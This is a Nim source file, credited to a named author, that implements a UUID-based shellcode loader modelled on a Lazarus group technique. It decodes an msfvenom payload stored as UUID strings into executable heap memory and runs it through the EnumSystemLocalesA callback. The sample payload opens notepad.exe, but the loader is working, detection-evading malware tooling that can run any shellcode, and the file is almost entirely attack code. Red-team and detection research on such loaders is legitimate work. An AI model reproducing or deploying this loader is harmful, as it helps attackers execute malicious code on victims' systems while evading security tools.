#[
    Author: Furkan Ayar, Twitter: @frknayar
    License: BSD 3-Clause

    This is NIM implementation of UUID Shellcode execution from HEAP memory area which has been seen in the wild by lazarus loader.
    References:
        - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
        - https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
        - https://gist.github.com/rxwx/c5e0e5bba8c272eb6daa587115ae0014#file-uuid-c
]#

import winim
import strformat

when defined(windows):

    when defined(amd64):
        echo "[*] Running in x64 Process"
        # msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread
        const SIZE = 18  
        var UUIDARR = allocCStringArray([ 
            "e48348fc-e8f0-00c0-0000-415141505251",
            "d2314856-4865-528b-6048-8b5218488b52",
            "728b4820-4850-b70f-4a4a-4d31c94831c0",
            "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
            "48514152-528b-8b20-423c-4801d08b8088",
            "48000000-c085-6774-4801-d0508b481844",
            "4920408b-d001-56e3-48ff-c9418b348848",
            "314dd601-48c9-c031-ac41-c1c90d4101c1",
            "f175e038-034c-244c-0845-39d175d85844",
            "4924408b-d001-4166-8b0c-48448b401c49",
            "8b41d001-8804-0148-d041-5841585e595a",
            "59415841-5a41-8348-ec20-4152ffe05841",
            "8b485a59-e912-ff57-ffff-5d48ba010000",
            "00000000-4800-8d8d-0101-000041ba318b",
            "d5ff876f-e0bb-2a1d-0a41-baa695bd9dff",
            "c48348d5-3c28-7c06-0a80-fbe07505bb47",
            "6a6f7213-5900-8941-daff-d56e6f746570",
            "652e6461-6578-0000-0000-000000000000" ])

    when isMainModule:
        # Creating and Allocating Heap Memory
        echo fmt"[*] Allocating Heap Memory"
        let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        let ha = HeapAlloc(hHeap, 0, 0x100000)
        var hptr = cast[DWORD_PTR](ha)
        if hptr != 0:
            echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
        else:
            echo fmt"[-] Heap Alloc Error "
            quit(QuitFailure)

        echo fmt"[*] UUID Array size is {SIZE}"
        # Planting Shellcode From UUID Array onto Allocated Heap Memory
        for i in 0..(SIZE-1):
            var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
            if status != RPC_S_OK:
                if status == RPC_S_INVALID_STRING_UUID:
                    echo fmt"[-] Invalid UUID String Detected"
                else:
                    echo fmt"[-] Something Went Wrong, Error Code: {status}"
                quit(QuitFailure)
            hptr += 16
        echo fmt"[+] Shellcode is successfully placed between 0x{(cast[DWORD_PTR](ha)).toHex} and 0x{hptr.toHex}"

        # Calling the Callback Function
        echo fmt"[*] Calling the Callback Function ..." 
        EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
        CloseHandle(hHeap)
        quit(QuitSuccess)
